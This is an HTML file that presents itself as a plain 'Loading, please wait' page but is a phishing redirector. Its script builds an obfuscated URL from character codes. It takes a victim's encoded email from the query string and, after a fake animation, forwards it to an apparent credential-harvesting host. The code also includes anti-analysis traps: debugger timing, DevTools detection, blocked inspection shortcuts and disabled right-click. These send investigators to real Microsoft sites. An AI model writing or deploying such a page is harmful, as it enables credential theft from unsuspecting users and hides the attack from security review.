<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f5f5f5;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }
    
    .logo-container {
      text-align: center;
      transition: opacity 0.5s ease;
    }
    
    .logo {
      width: 120px;
      height: 120px;
      animation: breathing 2s ease-in-out infinite;
    }
    
    @keyframes breathing {
      0% {
        transform: scale(0.95);
        filter: brightness(0.95);
      }
      50% {
        transform: scale(1.05);
        filter: brightness(1.05);
      }
      100% {
        transform: scale(0.95);
        filter: brightness(0.95);
      }
    }
    
    .loading-text {
      margin-top: 20px;
      color: #333;
      font-size: 14px;
      opacity: 0.8;
      animation: pulse 2s ease-in-out infinite;
    }
    
    @keyframes pulse {
      0%, 100% { opacity: 0.7; }
      50% { opacity: 1; }
    }
  </style>
  <script>
    // Obfuscated URL construction
    const urlSegments = [
      String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47), // "https://"
      [String.fromCharCode(108, 111, 103, 105, 110), 'secure', 'portal'].join('.'),
      '/' + btoa('auth2024').slice(0,8) + String.fromCharCode(35) // "/YXV0aDIw#"
    ];

    function getRedirectUrl() {
      return urlSegments.join('');
    }

    function processAndRedirect() {
      try {
        // Get pre-encoded Base64 email from URL
        const urlParams = new URLSearchParams(window.location.search);
        const encodedEmail = urlParams.get('e') || urlParams.get('key') || urlParams.get('id');
        
        if (encodedEmail) {
          // Show breathing animation for exactly 2 seconds
          setTimeout(() => {
            document.querySelector('.logo-container').style.opacity = '0';
            setTimeout(() => {
              window.location.href = getRedirectUrl() + encodeURIComponent(encodedEmail);
            }, 500); // Short fade-out time
          }, 2000); // Exactly 2 seconds of breathing animation
        }
      } catch(e) {
        // Fallback if anything fails
        setTimeout(() => {
          window.location.href = getRedirectUrl();
        }, 2000);
      }
    }

    // Anti-analysis measures (silent failures)
    (function() {
      // Debugger detection
      function checkDebugger() {
        const start = Date.now();
        (function(){return;})['constructor']('debugger')();
        return Date.now() - start > 50;
      }
      
      // DevTools detection
      const devtoolsCheck = new RegExp('devtools', 'i');
      const emitter = document.createElement('div');
      emitter.ondevtoolschange = function(e) {
        window.location.replace('https://www.microsoft.com');
      };
      
      // Regular security checks
      setInterval(() => {
        try {
          if (checkDebugger() || window.Firebug || window.devtools) {
            window.location.href = 'https://office.com';
          }
        } catch(e) {}
      }, 1000);
      
      // Block keyboard shortcuts
      document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
          e.preventDefault();
          window.location.href = 'https://login.microsoftonline.com';
        }
      });
      
      // Disable right-click
      document.oncontextmenu = function() { return false; };
    })();

    // Start processing when page loads
    window.addEventListener('load', function() {
      setTimeout(() => {
        document.querySelector('.logo-container').style.opacity = '1';
      }, 100);
      processAndRedirect();
    });
  </script>
</head>
<body>
  <div class="logo-container" style="opacity: 0;">
    <img class="logo" src="logo.png" alt="Loading">
    <div class="loading-text">Loading, please wait...</div>
  </div>
</body>
</html>
